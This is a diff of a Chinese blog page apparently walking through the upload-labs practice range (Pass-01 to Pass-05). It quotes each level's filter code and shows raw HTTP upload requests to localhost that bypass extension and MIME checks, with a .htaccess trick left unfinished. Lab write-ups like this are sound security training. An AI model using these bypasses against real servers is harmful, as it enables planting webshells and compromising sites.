@@ -16,25 +16,25 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="r1ng0rez">
-  <meta name="keywords" content="r1ng0rez wenling r00tk1t Solkatt p4y1oad 白色键盘">
+  <meta name="author" content="Zheng Hailin">
+  <meta name="keywords" content="r1ng0rez wenling r00tk1t Solkatt p4y1oad 白色键盘 Zheng Hailin">
   
-    <meta name="description" content="Introduction： Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。  正文开始Pass-01源码分析:function che">
+    <meta name="description" content="Introduction：  Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。  正文开始 Pass-01 源码分析: function">
 <meta property="og:type" content="article">
 <meta property="og:title" content="upload-labs靶场小计">
-<meta property="og:url" content="https://r1ng0rez.github.io/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/index.html">
-<meta property="og:site_name" content="r1ng0rez&#39;s Blog">
-<meta property="og:description" content="Introduction： Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。  正文开始Pass-01源码分析:function che">
+<meta property="og:url" content="https://iszhenghailin.github.io/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Zheng Hailin - r1ng0rez">
+<meta property="og:description" content="Introduction：  Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。  正文开始 Pass-01 源码分析: function">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-06-17T14:11:09.000Z">
 <meta property="article:modified_time" content="2025-06-17T14:47:42.550Z">
-<meta property="article:author" content="r1ng0rez">
+<meta property="article:author" content="Zheng Hailin">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>upload-labs靶场小计 - r1ng0rez&#39;s Blog</title>
+  <title>upload-labs靶场小计 - Zheng Hailin - r1ng0rez</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -76,7 +76,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"r1ng0rez.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"iszhenghailin.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -108,7 +108,7 @@
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
-      <strong>白いキーボードのBlog</strong>
+      <strong>Zheng Hailin</strong>
     </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
@@ -298,11 +298,15 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Introduction："><a href="#Introduction：" class="headerlink" title="Introduction："></a>Introduction：</h1><ul>
+                <h1>Introduction：</h1>
+<ul>
 <li><strong>Repo Address</strong>: <a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li>
 <li><strong>Description</strong>：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</li>
 </ul>
-<h1 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>源码分析</strong>:<br><div class="code-wrapper"><pre><code class="hljs Javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;
+<h1>正文开始</h1>
+<h2 id="Pass-01">Pass-01</h2>
+<p><strong>源码分析</strong>:</p>
+<div class="code-wrapper"><pre><code class="hljs Javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;
     <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;
     <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;
         <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);
@@ -319,8 +323,11 @@
         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
     &#125;
 &#125;
-</code></pre></div><br>在源码中我们可以看到其在客户端使用了js对不合法图片进行了检查，因此只需要在Firefox浏览器中禁用js即可绕过</p>
-<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>源码分析</strong>:<br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+</code></pre></div>
+<p>在源码中我们可以看到其在客户端使用了js对不合法图片进行了检查，因此只需要在Firefox浏览器中禁用js即可绕过</p>
+<h2 id="Pass-02">Pass-02</h2>
+<p><strong>源码分析</strong>:</p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -339,7 +346,9 @@
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
 &#125;
-</code></pre></div><br>在源码的<code>type</code>一处我们得知其对文件的类型做了限制，我们可以用BurpSuite或Yakit把数据包拉下来，然后将文件类型修改为对应的类型即可绕过<br><div class="code-wrapper"><pre><code class="hljs bash">payload:
+</code></pre></div>
+<p>在源码的<code>type</code>一处我们得知其对文件的类型做了限制，我们可以用BurpSuite或Yakit把数据包拉下来，然后将文件类型修改为对应的类型即可绕过</p>
+<div class="code-wrapper"><pre><code class="hljs bash">payload:
 POST /upload-labs/Pass-02/index.php HTTP/1.1
 Host: 127.0.0.1
 Accept-Encoding: gzip, deflate, br, zstd
@@ -369,8 +378,10 @@ Content-Type: image/png
 Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span>
 
 
-------WebKitFormBoundary9OENpdlcocFeQ6oY--</code></pre></div></p>
-<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>源码分析：</strong><br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+------WebKitFormBoundary9OENpdlcocFeQ6oY--</code></pre></div>
+<h2 id="Pass-03">Pass-03</h2>
+<p><strong>源码分析：</strong></p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -396,7 +407,9 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
-&#125;</code></pre></div><br>观察后发现其仅过滤了<code>asp</code>,<code>aspx</code>,<code>php</code>和<code>jsp</code>这四种后缀名，这里举一个例子<code>php</code>-&gt;<code>phtml</code>以混淆视听<br><div class="code-wrapper"><pre><code class="hljs bash">payload:
+&#125;</code></pre></div>
+<p>观察后发现其仅过滤了<code>asp</code>,<code>aspx</code>,<code>php</code>和<code>jsp</code>这四种后缀名，这里举一个例子<code>php</code>-&gt;<code>phtml</code>以混淆视听</p>
+<div class="code-wrapper"><pre><code class="hljs bash">payload:
 POST /upload-labs/Pass-03/index.php HTTP/1.1
 Host: 127.0.0.1
 Upgrade-Insecure-Requests: 1
@@ -426,8 +439,10 @@ Content-Type: application/octet-stream
 Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span>
 
 ------WebKitFormBoundaryAl4mS15DQA2JvZiO--
-</code></pre></div></p>
-<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>源码分析：</strong><br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+</code></pre></div>
+<h2 id="Pass-04">Pass-04</h2>
+<p><strong>源码分析：</strong></p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -453,7 +468,9 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
-&#125;</code></pre></div><br>在这里我们可以观察出其过滤了很多后缀名，其次<code>转换大小写</code>使得我们无法通过混淆大小写以绕过，但是其中的<code>去除字符串::$DATA</code>和<code>收尾去空</code>使得我们可以用类似于双后缀的方法绕过，这样它会把后面那个后缀吃掉而只保留前面的后缀，且只验证被吃掉的那个后缀，最终成功解析<br><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload-labs/Pass-04/index.php</span> <span class="hljs-meta">HTTP/1.1</span>
+&#125;</code></pre></div>
+<p>在这里我们可以观察出其过滤了很多后缀名，其次<code>转换大小写</code>使得我们无法通过混淆大小写以绕过，但是其中的<code>去除字符串::$DATA</code>和<code>收尾去空</code>使得我们可以用类似于双后缀的方法绕过，这样它会把后面那个后缀吃掉而只保留前面的后缀，且只验证被吃掉的那个后缀，最终成功解析</p>
+<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload-labs/Pass-04/index.php</span> <span class="hljs-meta">HTTP/1.1</span>
 <span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1
 <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryVUBAzK6LwIFArjzI
 <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate
@@ -481,8 +498,11 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
 <span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI</span>
 <span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span>
 <span class="language-php"></span>
-<span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI--</span></code></pre></div><br><strong>在此我们认识到了一个更加有效的对抗文件上传漏洞的方案——以白名单代替黑名单</strong></p>
-<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>源码分析：</strong><br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI--</span></code></pre></div>
+<p><strong>在此我们认识到了一个更加有效的对抗文件上传漏洞的方案——以白名单代替黑名单</strong></p>
+<h2 id="Pass-05">Pass-05</h2>
+<p><strong>源码分析：</strong></p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -509,7 +529,10 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
 &#125;
-</code></pre></div><br>这里我们乍一看跟上面第四关的源码好像是一摸一样的，但是其pass的思路不大相同，再看看提示<br><strong>提示：上传目录存在php文件（readme.php）</strong><br>笔者的第一想法可能是设计”文件包含(include)”，有了大致思路我们可以再想想应该如何去include这个存在我们的一句话或者是phpinfo的文件并将其正常解析，以传统的经验来看我们可以尝试着上传<code>.htaccess</code>文件，以下笔者在此阐述什么是<code>.htaccess</code>文件以及为什么要这样去做</p>
+</code></pre></div>
+<p>这里我们乍一看跟上面第四关的源码好像是一摸一样的，但是其pass的思路不大相同，再看看提示<br>
+<strong>提示：上传目录存在php文件（readme.php）</strong><br>
+笔者的第一想法可能是设计&quot;文件包含(include)&quot;，有了大致思路我们可以再想想应该如何去include这个存在我们的一句话或者是phpinfo的文件并将其正常解析，以传统的经验来看我们可以尝试着上传<code>.htaccess</code>文件，以下笔者在此阐述什么是<code>.htaccess</code>文件以及为什么要这样去做</p>
 
                 
               </div>
@@ -556,13 +579,13 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
   <div class="license-box my-3">
     <div class="license-title">
       <div>upload-labs靶场小计</div>
-      <div>https://r1ng0rez.github.io/2025/06/17/upload-labs靶场小计/</div>
+      <div>https://iszhenghailin.github.io/2025/06/17/upload-labs靶场小计/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>r1ng0rez</div>
+          <div>Zheng Hailin</div>
         </div>
       
       
@@ -599,6 +622,12 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2025/06/21/Crypto%E5%9F%BA%E7%A1%80%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86-%E6%95%B0%E8%AE%BA/" title="Crypto基础数学知识-数论">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Crypto基础数学知识-数论</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
